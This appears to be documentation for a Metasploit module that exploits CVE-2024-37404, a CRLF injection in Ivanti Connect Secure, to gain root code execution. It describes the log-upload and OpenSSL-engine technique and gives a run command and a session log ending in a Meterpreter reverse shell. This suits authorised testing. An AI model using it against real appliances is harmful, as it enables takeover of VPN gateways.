## Vulnerable Application

This module exploits a CRLF injection vulnerability in Ivanti Connect Secure to
achieve remote code execution (CVE-2024-37404). Versions prior to 22.7R2.1 are
vulnerable. Note that Ivanti Policy Secure versions prior to 22.7R1.1 are also
vulnerable but this module doesn't support this software.

Valid administrative credentials are required. A non-administrative user is also
required and can be created using the administrative account, if needed.

Finally, the `Client Log Upload` feature needs to be enabled. This can also
be done using the administrative interface (see the Installation Steps section
below), if it is not enabled already.

### Process Overview

First, the module will log into the administrative interface and check if the version
is vulnerable. Then, it will connect to the user interface using non-privileged
credentials and upload a log file archive containing the payload. This file is
stored as a known path on the server, which can be retrieved from the
administrative interface. Then, it leverages the CRLF vulnerability by creating
a Certificate Signing Request and passing a specially crafted OpenSSL
configuration. This configuration instructs OpenSSL to use a custom
cryptographic engine, which points to the log file path (our payload). The
payload is immediately executed, giving RCE as the root user on the appliance.

This has been successfully tested against Ivanti Connect Secure version 22.3R1 (build 1647).

### Installation Steps
Get an Ivanti Security Appliance (ISA) or a Virtual Appliances (ISA-V Series)
with a vulnerable Ivanti Connect Secure installed.

Note that it is not possible to download a trial version of a Virtual Appliance
unless you contact sales and request a demo.

Log into to the admin interface (https:/<IP>/admin) to proceed with the following requirements:

#### Create a normal user
- In the `Authentication` menu, select `Auth. Servers`.
- Select the `System Local` `Authentication/Authorization Servers` or any
  server with the type `Local Authentication`. Don't select the
  `Administrators` server since we need a non-administrative account.
- Click on the `Users` tab and then `New`.
- Fill the registration form and click `Save Changes`.

#### Enable Client Log
- Go to `Users` > `User Roles` and click on the `Users` role.
- Go to `General` > `Session Options`.
- Select `Enable Upload Logs` under the `Upload logs` section.
- Click `Save Changes`.


## Verification Steps
1. Start msfconsole
1. Do: `use linux/http/ivanti_connect_secure_rce_cve_2024_37404`
1. Do: `run verbose=true lhost=<local host> rhosts=<remote host> admin_username=<admin username> admin_password=<admin password> username=<normal user> password=<user password>`
1. You should get a Meterpreter session
1. Make sure the admin and the normal user have been logged out by logging in
   the web interfaces with a web browser (you should have any warning saying a
   session is already active)
1. Make sure the cleanup has been done correctly by checking `System` > `Log/Monitoring`


## Options

### ADMIN_USERNAME
Administrative username to authenticate with.

### ADMIN_PASSWORD
Administrator password to authenticate with.

### USERNAME
Normal user username to authenticate with.

### PASSWORD
Normal user password to authenticate with.


## Scenarios

### Ivanti Connect Secure version 22.3R1 (build 1647)

```
msf6 exploit(linux/http/ivanti_connect_secure_rce_cve_2024_37404) > run verbose=true lhost=192.168.211.69 rhosts=192.168.211.200 admin_username=msfadmin admin_password=1234567890 username=msfuser password=1234567890

[*] Started reverse TCP handler on 192.168.211.69:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Login to the administrative interface with username 'msfadmin' and password '1234567890'...
[!] The admin msfadmin is already logged in
[*] Getting the version...
[+] Found version 22.3R1 (build 1647)
[+] The target appears to be vulnerable.
[*] Uploading the payload...
[*] Login to the user interface with username 'msfuser' and password '1234567890'...
[*] Uploading the log file...
[*] Logging the user out...
[*] Getting the log file name...
[*] Triggering the payload...
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (1017704 bytes) to 192.168.211.200
[*] Cleaning up...
[*] Deleting the log file (payload)...
[*] Logging the administrator out...
[*] Meterpreter session 3 opened (192.168.211.69:4444 -> 192.168.211.200:50210) at 2024-10-29 16:43:35 +0100

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.211.200
OS           :  (Linux 4.15.18.34-production)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```
